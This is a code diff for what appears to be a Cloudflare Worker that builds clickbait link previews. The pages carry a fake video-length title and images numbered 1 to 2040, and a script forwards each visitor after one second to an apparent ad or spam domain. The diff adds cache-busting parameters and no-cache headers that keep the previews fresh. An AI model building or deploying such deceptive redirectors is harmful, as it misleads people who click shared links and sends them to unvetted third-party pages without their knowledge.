@@ -1,16 +1,31 @@
 export default {
-  async fetch(request, env) {
+  async fetch(request) {
     const url = new URL(request.url);
 
-    // Nếu không phải /api/... thì lấy file từ thư mục public
-    if (!url.pathname.startsWith("/api/")) {
-      return env.ASSETS.fetch(request);
+    const assetsHost =
+      "https://image-redirect.hoanglong-3nhe.workers.dev";
+
+    // Nếu truy cập trực tiếp /1.png, /2.png...
+    const imageFileMatch = url.pathname.match(/^\/(\d+)\.png$/);
+
+    if (imageFileMatch) {
+      const imageNumber = Number(imageFileMatch[1]);
+
+      if (imageNumber < 1 || imageNumber > 2040) {
+        return new Response("Not found", { status: 404 });
+      }
+
+      // Giữ query để tạo URL ảnh mới nếu có
+      const version =
+        url.searchParams.get("v") ||
+        Date.now().toString();
+
+      return fetch(
+        `${assetsHost}/${imageNumber}.png?v=${encodeURIComponent(version)}`
+      );
     }
 
-    // Ví dụ:
-    // /api/anh1 -> 1
-    // /api/anh3 -> 3
-    // /api/anh100 -> 100
+    // /api/anh1 -> số 1
     const match = url.pathname.match(/^\/api\/anh(\d+)$/);
 
     if (!match) {
@@ -21,18 +36,21 @@ export default {
 
     let imageNumber = Number(match[1]);
 
-    // Chỉ cho phép anh1 -> anh2040
     if (imageNumber < 1 || imageNumber > 2040) {
       imageNumber = 3;
     }
 
-    // Link chuyển hướng sau 1 giây
     const redirectUrl =
       "https://baggyrepackingrocky.com/2022576";
 
-    // public/3.png -> https://vidiy.fit/3.png
+    // Lấy version từ URL nếu có.
+    // Ví dụ /api/anh1?v=12345
+    const version =
+      url.searchParams.get("v") ||
+      Date.now().toString();
+
     const imageUrl =
-      `${url.origin}/${imageNumber}.png`;
+      `${assetsHost}/${imageNumber}.png?v=${encodeURIComponent(version)}`;
 
     const title = "69:07";
     const description =
@@ -63,14 +81,12 @@ export default {
 </head>
 
 <body>
-
 <script>
   setTimeout(function() {
     window.location.href =
       ${JSON.stringify(redirectUrl)};
   }, 1000);
 </script>
-
 </body>
 </html>`;
 
@@ -78,7 +94,9 @@ export default {
       status: 200,
       headers: {
         "Content-Type": "text/html; charset=UTF-8",
-        "Cache-Control": "no-store"
+        "Cache-Control": "no-store, no-cache, must-revalidate",
+        "Pragma": "no-cache",
+        "Expires": "0"
       }
     });
   }
